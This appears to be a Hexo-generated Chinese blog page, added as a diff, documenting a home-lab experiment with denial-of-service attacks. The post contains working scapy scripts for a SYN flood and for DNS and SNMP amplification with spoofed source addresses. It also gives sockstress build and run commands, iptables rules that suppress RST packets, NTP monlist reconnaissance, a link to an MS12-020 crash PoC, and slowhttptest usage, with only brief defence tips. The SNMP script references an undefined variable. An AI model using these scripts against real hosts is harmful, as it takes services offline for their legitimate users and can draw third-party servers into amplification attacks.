@@ -1,0 +1,711 @@
+<!DOCTYPE html>
+<html lang="">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="John Doe">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="John Doe">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog,hacker,pentesting">
+    
+    <meta name="description" content="">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>ddos攻击及检测 · thr0cyte&#39;s bolg</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon2.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >thr0cyte&#39;s blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">ddos攻击及检测</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>thr0cyte's blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            ddos攻击及检测
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ddos">ddos</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "抓包">抓包</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.7k</span>阅读时长: <span class="post-count reading-time">7 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/04/27</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>这两天玩了下传说中的拒绝服务，发现确实流氓：</p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>DDOS，全名为Distributed Denial of Service，意为分布式拒绝服务攻击，即利用各种资源和技术联合起来耗尽目标服务器带宽，使其无法处理正常请求来服务正常用户，从而实现敲诈勒索、报复、获取竞争优势的目的。<br>举一个例子可以很好的理解DDOS：街边开了一家奶茶店生意非常火爆，对门自己家的奶茶店无人问津，于是自己雇一些人早上一大早就去对门的奶茶店点一个奶茶，坐到晚上关门，使它无法服务真正的顾客，从而达到“抢生意”的目的。</p>
+<p>实验环境：kali(192.168.1.106)、win2003(192.168.1.105)、win7（192.168.1.103）</p>
+<h1 id="开始实验："><a href="#开始实验：" class="headerlink" title="开始实验："></a>开始实验：</h1><p>①SYN洪水攻击<br>  利用tcp三次握手的特性，对服务器发送syn请求，服务器回syn+ack后，不发送ack给服务器，从而导致tcp连接失败，当syn请求到达一定数量后，服务器将无法处理正常用户的syn请求。</p>
+<p>先增加防火墙规则，不让攻击机发rst包断开tcp连接：<br>iptables -A OUTPUT -p tcp –tcp-flags RST RST -d 192.168.1.103 -j DROP<br>iptables -L</p>
+<p>利用scapy模块：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line">from time import sleep</span><br><span class="line">import thread</span><br><span class="line">import random</span><br><span class="line"> </span><br><span class="line">if len(sys.argv)!=4:</span><br><span class="line">    print &quot;help:    ./syn_flood.py ip port threads&quot;</span><br><span class="line">    print &quot;example:  ./syn_flood.py 192.168.1.103 3389 20&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">ip = str(sys.argv[1])</span><br><span class="line">port = int(sys.argv[2])</span><br><span class="line">threads = int(sys.argv[3])</span><br><span class="line"></span><br><span class="line">print &quot;start attacking!&quot;</span><br><span class="line">def attack(ip,port):</span><br><span class="line">    while 1:</span><br><span class="line">        i = random.randint(1,65535)</span><br><span class="line">        send(IP(dst=ip)/TCP(dport=port,sport=i),verbose=0)</span><br><span class="line">        print &quot;[localhost: &quot;,i,&quot;----------------------------&gt;&quot;,ip,&quot;]&quot;,&quot;\n&quot;</span><br><span class="line">        </span><br><span class="line">for i in range(0,threads):</span><br><span class="line">    thread.start_new_thread(attack,(ip,port))</span><br><span class="line">    </span><br><span class="line">while 1:</span><br><span class="line">    sleep(1)</span><br></pre></td></tr></table></figure></p>
+<p>Linux线程20足矣，windows 线程15足矣。<br>实验效果：<br><img src="/images/ddos1.png" alt=""><br><img src="/images/ddos2.png" alt=""><br><img src="/images/ddos3.png" alt=""></p>
+<p>②sockstress攻击<br>   Sockstress也是一种基于tcp连接的拒绝服务攻击，与syn洪水攻击不同的是，它是一种慢速攻击。它通过将三次握手最后一个ack包的window size大小设为0，造成接收缓冲区已被填满的假象，维持tcp连接，当tcp连接数达到一定值时，服务器不在建立正常用户的tcp连接，从而达到拒绝服务攻击的目的。</p>
+<p>攻击代码：<a href="https://github.com/defuse/sockstress" target="_blank" rel="noopener">https://github.com/defuse/sockstress</a><br>下载下来编译一下:</p>
+<ul>
+<li>gcc -Wall -c sockstress.c<br>– gcc -pthread -o sockstress sockstress.o<br>– ./sockstress 1.1.1.1:80 eth0<br>– ./sockstress 1.1.1.1:80 eth0 -p payloads/http </li>
+</ul>
+<p>这种攻击也要增加防火墙规则：iptables -A OUTPUT -p tcp –tcp-flags RST RST -d 192.168.1.105 -j DROP<br>效果：<br><img src="/images/ddos4.png" alt=""><br><img src="/images/ddos5.png" alt=""><br><img src="/images/ddos6.png" alt=""><br><img src="/images/ddos7.png" alt=""><br><img src="/images/ddos8.png" alt=""><br><img src="/images/ddos9.png" alt=""><br>效果显著<br>防御方法：<br>限制单位时间内每ip建立的tcp连接数（对ddos无效）</p>
+<p>③DNS放大攻击<br>利用DNS服务器返回包是请求包的七八倍的特点，伪造源地址为受害者ip，向多个DNS服务器发送查询服务器请求，从而造成拒绝服务攻击。<br>还是利用scapy写个脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line">from time import sleep</span><br><span class="line">import thread</span><br><span class="line"></span><br><span class="line">if len(sys.argv)!=4:</span><br><span class="line">	print &quot;help:    ./dns_attack.py target dnsip threads&quot;</span><br><span class="line">	print &quot;example:     ./dns_attack  192.168.1.106 8.8.8.8 20&quot;  </span><br><span class="line">	sys.exit()</span><br><span class="line"></span><br><span class="line">target = str(sys.argv[1])</span><br><span class="line">dnsip = str(sys.argv[2])</span><br><span class="line">threads = int(sys.argv[3])</span><br><span class="line"></span><br><span class="line">print &quot;start attacking&quot;</span><br><span class="line">def attack(target,dnsip):</span><br><span class="line">	while 1:</span><br><span class="line">		send(IP(dst=dnsip,src=target)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=&quot;www.google.com&quot;)),verbose=0)</span><br><span class="line">		print &quot;dns request--------------&gt;&quot;,dnsip,&quot;\n&quot;</span><br><span class="line"></span><br><span class="line">for i in range(0,threads):</span><br><span class="line">	thread.start_new_thread(attack,(target,dnsip))</span><br><span class="line"></span><br><span class="line">while 1:</span><br><span class="line">	sleep(1)</span><br></pre></td></tr></table></figure></p>
+<p>效果：<br><img src="/images/ddos10.png" alt=""><br><img src="/images/ddos11.png" alt=""><br>服务器收到了很多dns解析结果，受了一点点影响，还是需配合大量dns服务器和肉鸡实现攻击</p>
+<p>④SNMP放大攻击<br>SNMP放大攻击是基于UDP协议的一种攻击方式，放大倍数有四五百倍之多。通过伪造源地址，向有缺陷的开启了SNMP服务的161端口服务器发送udp包，获取信息量巨大的oid信息，从而造成dos攻击。<br>脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line">from time import sleep</span><br><span class="line">import thread</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if len(sys.argv)!=4:</span><br><span class="line">	print &quot;help:    ./dns_attack.py Camouflageip snmpip threads&quot;</span><br><span class="line">	print &quot;example:     ./dns_attack  192.168.1.103 192.168.1.105 20&quot;  </span><br><span class="line">	sys.exit()</span><br><span class="line"></span><br><span class="line">Camouflageip = str(sys.argv[1])</span><br><span class="line">snmpip = str(sys.argv[2])</span><br><span class="line">threads = int(sys.argv[3])</span><br><span class="line"></span><br><span class="line">print &quot;start attacking&quot;</span><br><span class="line">def attack(Camouflageip,snmpip):</span><br><span class="line">	while 1:</span><br><span class="line">		i=IP(dst=snmpip,src=target)</span><br><span class="line">		u=UDP(dport=161,sport=161)</span><br><span class="line">		s=SNMP(community=&apos;public&apos;)</span><br><span class="line">		b=SNMPbulk(max_repetitions =700,varbindlist=[SNMPvarbind(oid=ASN1_OID(&apos;1.3.6.1.2.1.1&apos;)),SNMPvarbind(oid=ASN1_OID(&apos;1.3.6.1.2.1.19.1.3&apos;))])</span><br><span class="line">		s.PDU=b</span><br><span class="line">		r=(i/u/s)</span><br><span class="line">		send(r)</span><br><span class="line">		print snmpip,&quot;---------------&gt;&quot;,target</span><br><span class="line"></span><br><span class="line">for i in range(0,threads):</span><br><span class="line">	thread.start_new_thread(attack,( Camouflageip,snmpip))</span><br><span class="line">		</span><br><span class="line">while 1:</span><br><span class="line">	sleep(1)</span><br></pre></td></tr></table></figure></p>
+<p>演示：<br>只发一个请求的抓包：<br><img src="/images/ddos12.png" alt=""><br>python2 snmp_attack.py 192.168.1.103 192.168.1.105 50 开始攻击后：<br><img src="/images/ddos13.png" alt=""><br>效果显著，关键还能隐藏ip</p>
+<p>防御方法：开snmp的主机尽量不要暴露在外网，改默认密码来限制访问，或者改默认161端口。</p>
+<p>⑤NTP放大攻击<br>NTP，全名 Network Time Protocol ，用来保证网络设备时间同步<br>利用客户端查询时，NTP服务器返回最后同步时间的600个客户端ip的特点发起dos攻击，放大倍数约为100倍。（服务器需要开启monlist查询功能）<br>攻击方法：<br>查询是否开启ntp服务：<br> nmap -sU -p123 1.1.1.1<br>查询是否开启monlist功能：<br> ntpdc -n -c monlist 1.1.1.1<br>攻击脚本：<br><img src="/images/ddos14.png" alt=""></p>
+<p>防御方法：<br>1.把 NTP 服务器升级到 4.2.7p26<br>2.关闭NTP 服务的 monlist 功能，在ntp.conf配置文件中增加<code>disable monitor</code>选项<br>3.在网络出口封禁 UDP 123 端口</p>
+<p>⑥ssl洪水攻击：<br>利用服务器端协商安全TLS连接所需的处理能力，向服务器发送大量的垃圾数据，或者不断要求重新协商连接，从而致使服务器的资源超出限制并使其脱机。</p>
+<p>⑦ms12-020：<br><img src="/images/ddos15.png" alt=""><br>发了两次 ，win2003重启了<br>dat下载链接：<a href="http://aluigi.org/poc/termdd_1.dat" target="_blank" rel="noopener">http://aluigi.org/poc/termdd_1.dat</a></p>
+<p>⑧slowhttptest，针对web服务，利用http协议dos的工具<br>有3种模式：slow loris：http请求结尾只写\r\n，让服务器以为还有请求<br>               slow post：content-length写很大，body慢慢发送<br>             slow read：调整滑动窗口，使一次回应分成好多个包发送<br>slow loris：<br><img src="/images/ddos16.png" alt=""><br><a href="http://192.168.1.103" target="_blank" rel="noopener">http://192.168.1.103</a> 连接不上了，抓包看看<br><img src="/images/ddos17.png" alt=""><br>追踪tcp流：<br><img src="/images/ddos18.png" alt=""><br>slow post：<br><img src="/images/ddos19.png" alt=""><br>抓包：<br><img src="/images/ddos20.png" alt=""><br>追踪流：<br><img src="/images/ddos21.png" alt=""><br>slow read：<br><img src="/images/ddos22.png" alt=""><br>抓包：<br><img src="/images/ddos23.png" alt=""><br><br><br><br>⑨一些已经过时的dos攻击：<br>Smurf攻击：通过使用将回复地址设置成受害网络的广播地址的ICMP应答请求(ping)数据包，来淹没受害主机，最终导致该网络的所有主机都对此ICMP应答请求做出答复，导致网络阻塞。<br>Teardrop攻击：向被攻击者发送多个分片的IP包，某些操作系统收到含有重叠偏移的伪造分片数据包时将会出现系统奔溃、重启等现象<br>主要针对早期操作系统（95，98，2.x的安卓、6.0的ios）</p>
+<h1 id="防御姿势"><a href="#防御姿势" class="headerlink" title="防御姿势"></a>防御姿势</h1><p>1.定期扫描，及时察觉异常<br>2.在骨干节点配置专业的抗拒绝服务设备<br>3.过滤不必要的服务和端口</p>
+
+    </article>
+    <!-- license  -->
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2018/04/04/iscc2018最后一道misc-writeup/" title= "iscc2018最后一道misc writeup">
+                    <div class="prevTitle">iscc2018最后一道misc writeup</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:xpf1996cc@126.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/thr0cyte" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+            
+                <span class="iconfont-archer qq" title=qq>
+                  
+                  <img class="profile-qr" src="/assets/qq.png" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="//steamcommunity.com/profiles/76561198419876010/" class="iconfont-archer steam" target="_blank" title=steam></a>
+            
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        
+    </div>
+
+    
+    <div class="busuanzi-container">
+    
+     
+    
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#开始实验："><span class="toc-number">2.</span> <span class="toc-text">开始实验：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#防御姿势"><span class="toc-number">3.</span> <span class="toc-text">防御姿势</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 2
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/27</span><a class="archive-post-title" href= "/2018/04/27/ddos攻击及检测/" >ddos攻击及检测</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/04</span><a class="archive-post-title" href= "/2018/04/04/iscc2018最后一道misc-writeup/" >iscc2018最后一道misc writeup</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="ddos"><span class="iconfont-archer">&#xe606;</span>ddos</span>
+    
+        <span class="sidebar-tag-name" data-tags="抓包"><span class="iconfont-archer">&#xe606;</span>抓包</span>
+    
+        <span class="sidebar-tag-name" data-tags="misc"><span class="iconfont-archer">&#xe606;</span>misc</span>
+    
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="writeup"><span class="iconfont-archer">&#xe606;</span>writeup</span>
+    
+        <span class="sidebar-tag-name" data-tags="iscc"><span class="iconfont-archer">&#xe606;</span>iscc</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "John Doe"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
